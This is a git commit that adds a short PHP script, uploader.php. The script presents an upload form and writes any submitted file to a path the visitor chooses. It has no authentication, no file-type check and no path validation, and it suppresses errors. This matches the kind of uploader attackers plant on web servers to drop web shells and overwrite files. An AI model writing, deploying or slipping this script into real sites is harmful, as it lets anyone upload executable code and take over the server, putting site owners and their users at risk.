a5ab2b68311139a7c68a628057596f5ed42eb727
shithil008 <32437885+shithil008@users.noreply.github.com>
2022-04-09 01:59:51 +0600

    uploader.php

---
+++ uploader.php
@@ -0,0 +1,19 @@
+﻿<?php
+
+
+
+$files = @$_FILES["files"];
+
+if ($files["name"] != '') {
+
+    $fullpath = $_REQUEST["path"] . $files["name"];
+
+  
+
+}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
+
+  if (move_uploaded_file($files['tmp_name'], $fullpath)) {
+
+        echo "<h1>file uploaded<br><a href='$fullpath'><font color='#006400'>Click here!</font></a></h1>";
+
+    }
